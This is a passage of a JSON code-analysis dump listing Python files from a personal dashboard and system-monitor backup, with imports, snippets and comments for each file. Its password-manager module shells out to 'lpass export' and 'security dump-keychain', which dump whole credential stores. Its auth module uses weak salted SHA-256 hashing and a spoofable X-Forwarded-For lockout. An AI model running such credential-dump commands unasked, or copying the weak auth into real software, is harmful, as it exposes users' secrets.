        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/setup_auth.py",
        "docstrings": [],
        "function_defs": [
          "def generate_salt() -> str:\n\"\"\"Generate a random salt.\"\"\"\nreturn base64.b64encode(secrets.token_bytes(16)).decode('utf-8')\n\ndef hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"",
          "def hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"\ncombined = password.encode() + base64.b64decode(salt)\nreturn base64.b64encode(hashlib.sha256(combined).digest()).decode('utf-8')\n\ndef main():\n\"\"\"Set up dashboard authentication.\"\"\"",
          "def main():\n\"\"\"Set up dashboard authentication.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard')\nconfig_path = base_path / 'config/auth.json'\n\nif not config_path.parent.exists():\nconfig_path.parent.mkdir(parents=True)\n\n# Get credentials\nprint(\"Setting up dashboard authentication\")"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import getpass",
          "import hashlib",
          "import base64",
          "import secrets",
          "from pathlib import Path"
        ],
        "comments": [
          "# Get credentials",
          "# Generate salt and hash",
          "# Create or update config"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/simple_server.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class SimpleHandler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/socket_test.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import socket",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/system_metrics.py",
        "docstrings": [],
        "function_defs": [
          "def get_cpu_metrics(self) -> Dict:\n\"\"\"Get detailed CPU metrics.\"\"\"\ntry:\ncpu_freq = psutil.cpu_freq()\nreturn {\n'percent': psutil.cpu_percent(interval=1),\n'per_cpu': psutil.cpu_percent(interval=1, percpu=True),\n'count': psutil.cpu_count(),\n'count_logical': psutil.cpu_count(logical=True),\n'freq': {",
          "def get_memory_metrics(self) -> Dict:\n\"\"\"Get detailed memory metrics.\"\"\"\ntry:\nvm = psutil.virtual_memory()\nsm = psutil.swap_memory()\nreturn {\n'virtual': {\n'total_gb': round(vm.total / (1024**3), 2),\n'available_gb': round(vm.available / (1024**3), 2),\n'used_gb': round(vm.used / (1024**3), 2),",
          "def get_disk_metrics(self) -> Dict:\n\"\"\"Get detailed disk metrics.\"\"\"\ntry:\npath = '/Volumes/Mac Mini External'\nusage = psutil.disk_usage(path)\nio_counters = psutil.disk_io_counters()\n\nreturn {\n'usage': {\n'total_gb': round(usage.total / (1024**3), 2),",
          "def get_network_metrics(self) -> Dict:\n\"\"\"Get detailed network metrics with improved error handling.\"\"\"\nmetrics = {'interfaces': {}, 'connections': {'total': 0, 'by_status': {}}}\n\n# Get interface metrics first\ntry:\nio_counters = psutil.net_io_counters(pernic=True)\nfor nic, stats in io_counters.items():\n# Skip loopback and inactive interfaces\nif nic in ('lo', 'lo0') or not any([getattr(stats, attr, 0) for attr in ['bytes_sent', 'bytes_recv']]):",
          "def get_process_metrics(self, top_n: int = 10) -> List[Dict]:\n\"\"\"Get detailed process metrics.\"\"\"\ntry:\nprocesses = []\nfor proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):\ntry:\npinfo = proc.info\n# Get additional details\nwith proc.oneshot():\npinfo['memory_gb'] = round(proc.memory_info().rss / (1024**3), 3)",
          "def get_all_metrics(self) -> Dict:\n\"\"\"Get all system metrics.\"\"\"\nreturn {\n'timestamp': datetime.now().isoformat(),\n'cpu': self.get_cpu_metrics(),\n'memory': self.get_memory_metrics(),\n'disk': self.get_disk_metrics(),\n'network': self.get_network_metrics(),\n'processes': self.get_process_metrics()\n}"
        ],
        "class_defs": [
          "class SystemMetrics:"
        ],
        "imports": [
          "import os",
          "import psutil",
          "import logging",
          "from typing import Dict, List, Optional",
          "from datetime import datetime",
          "from pathlib import Path",
          "from metrics_cache import cached",
          "from logging_config import log_with_context"
        ],
        "comments": [
          "# Get interface metrics first",
          "# Skip loopback and inactive interfaces",
          "# Log only if debug is enabled",
          "# Only log interface errors at WARNING level",
          "# Get connection metrics",
          "# Handle access denied quietly - normal for non-root users",
          "# Only log unexpected connection errors at WARNING level",
          "# Get additional details",
          "# Sort by CPU percent and return top N"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 19,
        "decorators": [
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=30)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/test.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/test_logging.py",
        "docstrings": [],
        "function_defs": [
          "def before_request():",
          "def after_request(response):",
          "def home():",
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Set up logging",
          "# Create Flask app",
          "# Add before/after request logging"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.before_request",
          "@app.after_request",
          "@app.route('/')",
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/test_services.py",
        "docstrings": [],
        "function_defs": [
          "def test_configuration():\n\"\"\"Test configuration system.\"\"\"\nlogger.info(\"Testing configuration...\")\n\n# Check directory structure\ndirs_to_check = [\nservice_config.log_dir,\nservice_config.state_dir,\nservice_config.config_dir\n]",
          "def test_service_registry():\n\"\"\"Test service registry functionality.\"\"\"\nlogger.info(\"Testing service registry...\")\n\n# Register test service\nservice_registry.register_service('test_service', TestService)\n\n# Start service\nsuccess = service_registry.start_service('test_service')\nassert success, \"Failed to start test service\"",
          "def test_error_recovery():\n\"\"\"Test error recovery mechanisms.\"\"\"\nlogger.info(\"Testing error recovery...\")\n\n# Start service\nservice_registry.start_service('test_service')\n\n# Wait for error (occurs every 10 iterations)\nlogger.info(\"Waiting for error condition...\")\ntime.sleep(12)  # Ensure we hit an error",
          "def main():\n\"\"\"Run all tests.\"\"\"\ntry:\ntest_configuration()\ntest_service_registry()\ntest_error_recovery()\n\nlogger.info(\"All tests passed!\")\nreturn 0\n"
        ],
        "class_defs": [],
        "imports": [
          "import time",
          "import json",
          "from pathlib import Path",
          "import logging",
          "from src.config.service_config import service_config",
          "from src.services.service_registry import service_registry",
          "from src.services.test_service import TestService"
        ],
        "comments": [
          "# Set up logging",
          "# Check directory structure",
          "# Check config loading",
          "# Register test service",
          "# Start service",
          "# Check status",
          "# Wait for some iterations",
          "# Check state file",
          "# Stop service",
          "# Start service",
          "# Wait for error (occurs every 10 iterations)",
          "# Check recovery",
          "# Stop service"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/test_socket.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from werkzeug.serving import run_simple",
          "import socket",
          "import os"
        ],
        "comments": [
          "# Remove socket if it already exists",
          "# Create Unix domain socket",
          "# Run Flask with Unix socket"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/test_waitress.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from waitress import serve"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/warp_commander.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _generate_core_commands(self) -> List[str]:\n\"\"\"Generate commands for core infrastructure development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/monitor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/password_manager.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/docker_manager.py\"\n]\n\ndef _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"",
          "def _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/system_brain.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/model_trainer.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/pattern_analyzer.py\"\n]\n\ndef _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"",
          "def _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/controller.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/task_scheduler.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/safety_monitor.py\"\n]\n\ndef _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"",
          "def _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/consciousness.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/adaptor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/optimizer.py\"\n]\n\nasync def execute_commands(self, commands: List[str]):\n\"\"\"Execute commands through Warp\"\"\"",
          "def _log_execution(self, command: str, stdout: bytes, stderr: bytes):\n\"\"\"Log command execution results\"\"\"\ntry:\nself.command_history.append({\n\"timestamp\": datetime.now().isoformat(),\n\"command\": command,\n\"stdout\": stdout.decode() if stdout else \"\",\n\"stderr\": stderr.decode() if stderr else \"\",\n\"phase\": self.current_phase\n})",
          "def _save_history(self):\n\"\"\"Save command execution history\"\"\"\ntry:\nhistory_path = Path(\"/Volumes/Mac Mini External/MemoryCore/logs/command_history.json\")\nhistory_path.parent.mkdir(parents=True, exist_ok=True)\n\nwith open(history_path, 'w') as f:\njson.dump(self.command_history, f, indent=2)\n\nexcept Exception as e:"
        ],
        "class_defs": [
          "class WarpCommander:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "from datetime import datetime",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Execute command",
          "# Wait for completion",
          "# Log results",
          "# Save history periodically",
          "# Generate commands for current phase",
          "# Execute commands",
          "# Move to next phase",
          "# Brief pause between phases",
          "# Check completion status",
          "# Run monitoring in parallel with development"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/docs/generate_docs.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def generate_all(self):\n\"\"\"Generate all documentation.\"\"\"\ntry:\nself.generate_architecture_docs()\nself.generate_api_docs()\nself.generate_deployment_docs()\nself.generate_troubleshooting_docs()\nself.generate_index()\n\nlogger.info(\"Documentation generation completed successfully\")",
          "def generate_architecture_docs(self):\n\"\"\"Generate system architecture documentation.\"\"\"\nlogger.info(\"Generating architecture documentation\")\n\ncontent = [\n\"# System Architecture\\n\",\n\"## Overview\\n\",\n\"The dashboard system consists of several key components working together \",\n\"to provide real-time monitoring and visualization capabilities.\\n\",\n",
          "def generate_api_docs(self):\n\"\"\"Generate API documentation.\"\"\"\nlogger.info(\"Generating API documentation\")\n\ncontent = [\n\"# API Documentation\\n\",\n\"## Overview\\n\",\n\"The dashboard provides a RESTful API for interacting with the system.\\n\\n\",\n\"## Authentication\\n\",\n\"API requests require authentication using a Bearer token:\\n\",",
          "def generate_deployment_docs(self):\n\"\"\"Generate deployment documentation.\"\"\"\nlogger.info(\"Generating deployment documentation\")\n\ncontent = [\n\"# Deployment Guide\\n\",\n\"## Prerequisites\\n\",\n\"- Python 3.9 or higher\\n\",\n\"- System dependencies listed in requirements.txt\\n\",\n\"- Access to deployment environment\\n\\n\",",
          "def generate_troubleshooting_docs(self):\n\"\"\"Generate troubleshooting documentation.\"\"\"\nlogger.info(\"Generating troubleshooting documentation\")\n\ncontent = [\n\"# Troubleshooting Guide\\n\",\n\"## Common Issues\\n\"\n]\n\n# Document common issues and solutions",
          "def generate_index(self):\n\"\"\"Generate documentation index.\"\"\"\nlogger.info(\"Generating documentation index\")\n\ncontent = [\n\"# Dashboard Documentation\\n\",\nf\"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n\",\n\"## Contents\\n\",\n\"- [System Architecture](architecture.md)\\n\",\n\"- [API Documentation](api.md)\\n\",",
          "def _analyze_components(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system components from source code.\"\"\"\ncomponents = []\n\nfor py_file in self.src_dir.rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n\ntree = ast.parse(content)",
          "def _extract_features(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract key features from class methods.\"\"\"\nfeatures = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\ndoc = ast.get_docstring(child)\nif doc and not child.name.startswith('_'):\nfeatures.append(f\"{child.name}: {doc.split('.')[0]}\")\n",
          "def _extract_interfaces(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract public interfaces from class.\"\"\"\ninterfaces = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\nif not child.name.startswith('_'):\nargs = [arg.arg for arg in child.args.args[1:]]  # Skip self\ninterfaces.append(\nf\"{child.name}({', '.join(args)})\"",
          "def _extract_dependencies(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract dependencies from class imports.\"\"\"\ndependencies = []\n\n# Look at module level imports\nmodule = node.parent\nif isinstance(module, ast.Module):\nfor child in module.body:\nif isinstance(child, (ast.Import, ast.ImportFrom)):\nif isinstance(child, ast.Import):",
          "def _analyze_data_flow(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system data flow.\"\"\"\n# This would typically be based on actual system analysis\n# Here's a simplified example\nreturn [\n{\n'name': 'Data Collection',\n'description': 'System metrics and events are collected from various sources'\n},\n{",
          "def _analyze_endpoints(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze API endpoints from route definitions.\"\"\"\nendpoints = []\n\n# Look for FastAPI/Flask route decorators\nfor py_file in (self.src_dir / 'api').rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n",
          "def _parse_endpoint(",
          "def _load_deploy_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig_file = self.base_path / 'deploy/config.json'\nif config_file.exists():\nwith open(config_file) as f:\nreturn json.load(f)\nreturn {}\n\ndef _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"",
          "def _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"\nreturn {\n'Performance': [\n{\n'problem': 'High CPU Usage',\n'symptoms': 'Dashboard response time is slow, system resources are strained',\n'causes': [\n'Too many concurrent connections',\n'Inefficient query patterns',",
          "def _write_doc(self, filename: str, content: List[str]):\n\"\"\"Write documentation to file.\"\"\"\noutput_file = self.output_dir / filename\nwith open(output_file, 'w') as f:\nf.write(''.join(content))\nlogger.info(f\"Generated {filename}\")\n\ndef main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"",
          "def main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(description='Generate dashboard documentation')\nparser.add_argument(\n'--type',\nchoices=['all', 'architecture', 'api', 'deployment', 'troubleshooting'],\ndefault='all',\nhelp='Type of documentation to generate'"
        ],
        "class_defs": [
          "class DocGenerator:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import logging",
          "from pathlib import Path",
          "from typing import List, Dict, Any",
          "import json",
          "import ast",
          "import inspect",
          "import re",
          "import mistune",
          "from datetime import datetime",
          "import argparse"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Initialize Markdown renderer",
          "# Document main components",
          "# Document system interactions",
          "# Generate Mermaid.js diagram",
          "# Document data flow",
          "# Document API endpoints",
          "# Document deployment environments",
          "# Document deployment steps",
          "# Document common issues and solutions",
          "# Extract class documentation and structure",
          "# Look at module level imports",
          "# This would typically be based on actual system analysis",
          "# Here's a simplified example",
          "# Look for FastAPI/Flask route decorators",
          "# Extract HTTP method and path from decorator",
          "# Parse parameters from function arguments",
          "# Create a sample response based on return annotation"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from pathlib import Path"
        ],
        "comments": [
          "# Set base paths"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/auth.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def load_config(self):\n\"\"\"Load authentication configuration.\"\"\"\ntry:\nif not self.config_path.exists():\nraise FileNotFoundError(\"Authentication config not found\")\n\nwith open(self.config_path) as f:\nself.config = json.load(f)\n\n# Validate config",
          "def hash_password(self, password: str) -> str:\n\"\"\"Hash password with stored salt.\"\"\"\nsalt = self.config['auth']['credentials']['salt']\ncombined = password.encode() + base64.b64decode(salt)\nreturn base64.b64encode(hashlib.sha256(combined).digest()).decode('utf-8')\n\ndef verify_password(self, password: str) -> bool:\n\"\"\"Verify password against stored hash.\"\"\"",
          "def verify_password(self, password: str) -> bool:\n\"\"\"Verify password against stored hash.\"\"\"\nstored_hash = self.config['auth']['credentials']['password_hash']\nif not stored_hash:\nreturn False\nreturn self.hash_password(password) == stored_hash\n\ndef is_locked_out(self, ip: str) -> bool:\n\"\"\"Check if IP is locked out due to too many failed attempts.\"\"\"",
          "def is_locked_out(self, ip: str) -> bool:\n\"\"\"Check if IP is locked out due to too many failed attempts.\"\"\"\nif ip not in self.failed_attempts:\nreturn False\n\n# Clean up old attempts\ncutoff = time.time() - self.config['auth']['lockout_duration']\nself.failed_attempts[ip] = [\nt for t in self.failed_attempts[ip]\nif t > cutoff",
          "def record_failed_attempt(self, ip: str):\n\"\"\"Record a failed login attempt.\"\"\"\nif ip not in self.failed_attempts:\nself.failed_attempts[ip] = []\nself.failed_attempts[ip].append(time.time())\n\ndef clear_failed_attempts(self, ip: str):\n\"\"\"Clear failed attempts for IP.\"\"\"",
          "def clear_failed_attempts(self, ip: str):\n\"\"\"Clear failed attempts for IP.\"\"\"\nself.failed_attempts.pop(ip, None)\n\ndef check_auth(self) -> bool:\n\"\"\"Check if current request is authenticated.\"\"\"",
          "def check_auth(self) -> bool:\n\"\"\"Check if current request is authenticated.\"\"\"\n# Check session authentication\nif 'authenticated' in session:\n# Check session expiry\nif session.get('expires_at', 0) > time.time():\nreturn True\nsession.clear()\n\n# Check token authentication",
          "def verify_token(self, token: str) -> bool:\n\"\"\"Verify API token.\"\"\"\nif not self.config.get('api', {}).get('tokens_enabled'):\nreturn False\n\ntry:\n# In a real implementation, you would verify against stored tokens\n# For now, we'll use a simple check\nreturn False\nexcept:",
          "def login(self, username: str, password: str, ip: str) -> bool:\n\"\"\"Attempt login.\"\"\"\nif self.is_locked_out(ip):\nreturn False\n\nif (\nusername == self.config['auth']['credentials']['username']\nand self.verify_password(password)\n):\nself.clear_failed_attempts(ip)",
          "def logout(self):\n\"\"\"Log out current session.\"\"\"\nsession.clear()\n\ndef get_client_ip() -> str:\n\"\"\"Get client IP address.\"\"\"",
          "def get_client_ip() -> str:\n\"\"\"Get client IP address.\"\"\"\nif request.headers.get('X-Forwarded-For'):\nreturn request.headers['X-Forwarded-For'].split(',')[0].strip()\nreturn request.remote_addr or '0.0.0.0'\n\n# Create auth manager instance\nauth_manager = AuthManager()\n\ndef requires_auth(f):",
          "def requires_auth(f):\n\"\"\"Decorator for routes that require authentication.\"\"\"\n@wraps(f)\ndef decorated(*args, **kwargs):\nif not auth_manager.check_auth():\nif request.is_json:\nreturn jsonify({'error': 'Unauthorized'}), 401\nreturn redirect(url_for('login'))\nreturn f(*args, **kwargs)\nreturn decorated",
          "def decorated(*args, **kwargs):"
        ],
        "class_defs": [
          "class AuthManager:"
        ],
        "imports": [
          "import os",
          "import json",
          "import time",
          "import base64",
          "import hashlib",
          "import logging",
          "from pathlib import Path",
          "from typing import Dict, Optional",
          "from datetime import datetime, timedelta",
          "from functools import wraps",
          "from flask import request, jsonify, session, redirect, url_for"
        ],
        "comments": [
          "# Validate config",
          "# Use default config",
          "# Clean up old attempts",
          "# Check session authentication",
          "# Check session expiry",
          "# Check token authentication",
          "# In a real implementation, you would verify against stored tokens",
          "# For now, we'll use a simple check",
          "# Create auth manager instance"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": [
          "@wraps(f)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/system_monitor/docker_manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _get_service_info(self, container) -> Dict:\n\"\"\"Get detailed service information\"\"\"\ntry:\nreturn {\n'id': container.id,\n'name': container.name,\n'status': container.status,\n'health': getattr(container, 'health', 'N/A'),\n'image': container.image.tags[0] if container.image.tags else 'none',\n'created': container.attrs['Created'],",
          "def _needs_credential_rotation(self, service_name: str) -> bool:\n\"\"\"Check if service credentials need rotation\"\"\"\n# Implement credential rotation check logic\nreturn False\n\nasync def _rotate_service_credentials(self, service_name: str):\n\"\"\"Rotate service credentials\"\"\""
        ],
        "class_defs": [
          "class DockerManager:"
        ],
        "imports": [
          "import docker",
          "import logging",
          "import json",
          "import asyncio",
          "from typing import Dict, List, Optional",
          "from datetime import datetime"
        ],
        "comments": [
          "# Check health status",
          "# Store health check result",
          "# Update service credentials",
          "# Implement credential rotation check logic",
          "# Implement credential rotation logic",
          "# Try to restart the container",
          "# Wait for container to stabilize",
          "# Check if healing was successful",
          "# Save backup"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/system_monitor/monitor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config_path: str):",
          "def _load_config(self, path: str) -> dict:",
          "def setup_logging(self):",
          "def main():"
        ],
        "class_defs": [
          "class SystemMonitor:"
        ],
        "imports": [
          "import yaml",
          "import logging",
          "import asyncio",
          "import docker",
          "import keyring",
          "import os",
          "import sys",
          "from datetime import datetime",
          "from typing import Dict, List, Any",
          "from pathlib import Path",
          "import psutil"
        ],
        "comments": [
          "# Set up logging based on config",
          "# Check thresholds",
          "# Check authentication logs",
          "# Monitor failed login attempts",
          "# Check system integrity",
          "# Verify service permissions",
          "# Scan for new services",
          "# Implement service discovery logic"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/system_monitor/password_manager.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _get_lastpass_entries(self) -> Dict:\n\"\"\"Get entries from LastPass\"\"\"\ntry:\n# Use lastpass-cli to get entries\nresult = subprocess.run(\n['lpass', 'export'],\ncapture_output=True,\ntext=True\n)\nreturn json.loads(result.stdout)",
          "def _get_keychain_entries(self) -> Dict:\n\"\"\"Get entries from macOS Keychain\"\"\"\ntry:\n# Use security command-line tool to get entries\nresult = subprocess.run(\n['security', 'dump-keychain'],\ncapture_output=True,\ntext=True\n)\n# Parse the output and return structured data",
          "def _sync_entries(self, lastpass: Dict, keychain: Dict):\n\"\"\"Synchronize entries between LastPass and Keychain\"\"\"\ntry:\n# Compare and update entries\nfor service, lp_entry in lastpass.items():\nif service not in keychain:\n# Add to Keychain\nself._add_to_keychain(service, lp_entry)\nelif self._needs_update(lp_entry, keychain[service]):\n# Update Keychain",
          "def _add_to_keychain(self, service: str, entry: Dict):\n\"\"\"Add entry to macOS Keychain\"\"\"\ntry:\nkeyring.set_password(\nservice,\nentry['username'],\nentry['password']\n)\nself.logger.info(f\"Added {service} to Keychain\")\nexcept Exception as e:",
          "def _update_keychain(self, service: str, entry: Dict):\n\"\"\"Update entry in macOS Keychain\"\"\"\ntry:\nkeyring.set_password(\nservice,\nentry['username'],\nentry['password']\n)\nself.logger.info(f\"Updated {service} in Keychain\")\nexcept Exception as e:",
          "def _add_to_lastpass(self, service: str, entry: Dict):\n\"\"\"Add entry to LastPass\"\"\"\ntry:\n# Use lastpass-cli to add entry\nsubprocess.run([\n'lpass', 'add',\n'--non-interactive',\n'--sync=now',\nf\"--username={entry['username']}\",\nf\"--password={entry['password']}\",",
          "def _needs_update(self, lp_entry: Dict, kc_entry: Dict) -> bool:\n\"\"\"Check if entry needs updating\"\"\"\nreturn (\nlp_entry['username'] != kc_entry['username'] or\nlp_entry['password'] != kc_entry['password']\n)\n\ndef _parse_keychain_output(self, output: str) -> Dict:\n\"\"\"Parse keychain command output into structured data\"\"\"",
          "def _parse_keychain_output(self, output: str) -> Dict:\n\"\"\"Parse keychain command output into structured data\"\"\"\n# Implement parsing logic here\n# This is a placeholder that needs to be implemented\n# based on the actual output format\nreturn {}\n\nasync def rotate_passwords(self):\n\"\"\"Implement password rotation logic\"\"\""
        ],
        "class_defs": [
          "class PasswordManager:"
        ],
        "imports": [
          "import keyring",
          "import subprocess",
          "import json",
          "import logging",
          "from typing import Dict, Optional",
          "from datetime import datetime"
        ],
        "comments": [
          "# Get LastPass entries",
          "# Get Keychain entries",
          "# Sync entries",
          "# Use lastpass-cli to get entries",
          "# Use security command-line tool to get entries",
          "# Parse the output and return structured data",
          "# Compare and update entries",
          "# Add to Keychain",
          "# Update Keychain",
          "# Handle Keychain entries not in LastPass",
          "# Add to LastPass",
          "# Use lastpass-cli to add entry",
          "# Implement parsing logic here",
          "# This is a placeholder that needs to be implemented",
          "# based on the actual output format",
          "# To be implemented based on rotation rules",
          "# To be implemented"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/conftest.py",
        "docstrings": [],
        "function_defs": [
          "def test_dir() -> Generator[Path, None, None]:\n\"\"\"Create a temporary test directory.\"\"\"\nwith tempfile.TemporaryDirectory() as temp_dir:\nyield Path(temp_dir)\n\n@pytest.fixture(scope='session')\ndef mock_metrics() -> Dict[str, Any]:\n\"\"\"Create mock system metrics.\"\"\"",
          "def mock_metrics() -> Dict[str, Any]:\n\"\"\"Create mock system metrics.\"\"\"\nreturn {\n'cpu': {\n'percent': 50.0,\n'count': 8,\n'count_logical': 16,\n'per_cpu': [45.0, 55.0, 48.0, 52.0, 47.0, 53.0, 46.0, 54.0],\n'load_avg': [2.5, 2.7, 2.6]\n},",
          "def mock_system_info() -> Dict[str, Any]:\n\"\"\"Create mock system information.\"\"\"\nreturn {\n'os': 'Darwin',\n'version': '21.6.0',\n'arch': 'x86_64',\n'hostname': 'test-host',\n'uptime': 86400,  # 1 day\n'boot_time': 1625097600,  # 2021-07-01 00:00:00\n'users': [",
